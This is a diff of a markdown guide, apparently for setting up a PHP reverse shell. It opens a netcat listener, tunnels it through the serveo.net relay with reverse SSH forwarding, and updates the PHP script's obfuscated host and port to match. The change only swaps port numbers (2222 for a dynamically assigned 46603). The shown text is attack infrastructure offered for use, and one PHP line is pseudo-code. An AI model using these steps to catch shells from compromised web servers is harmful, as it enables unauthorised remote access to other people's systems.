@@ -102,18 +102,18 @@ nc -lvnp 4444
 **Run this command:**
 
 ```bash
-ssh -R 2222:localhost:4444 serveo.net
+ssh -R 0:localhost:4444 serveo.net
 ```
 **It will say something like:**
 
 ```csharp
-Forwarding TCP connections from serveo.net:2222
+Forwarding TCP connections from serveo.net:46603
 ```
 **Update your PHP script:**
 
 ```php
 $ip_b64 = base64_encoded of serveo.net;
-$port = 2222;
+$port = 46603;
 ```
 **Start your listener:**
 
